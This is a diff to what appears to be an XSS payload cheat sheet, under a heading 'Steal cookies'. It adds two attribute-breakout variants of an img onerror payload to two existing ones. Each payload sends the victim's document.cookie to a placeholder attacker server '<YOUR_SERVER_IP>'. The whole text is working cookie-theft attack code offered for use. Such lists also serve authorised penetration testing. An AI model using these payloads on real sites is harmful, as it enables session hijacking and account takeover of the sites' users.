@@ -19,6 +19,8 @@ Steal cookies
 
 	<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
 	<img src=x onerror=fetch("http://<YOUR_SERVER_IP>/"+document.cookie)>
+	"><img src=x onerror=fetch("http://<YOUR_SERVER_IP>/"+document.cookie)>
+	'><img src=x onerror=fetch("http://<YOUR_SERVER_IP>/"+document.cookie)>
 
 ## php payloads
 
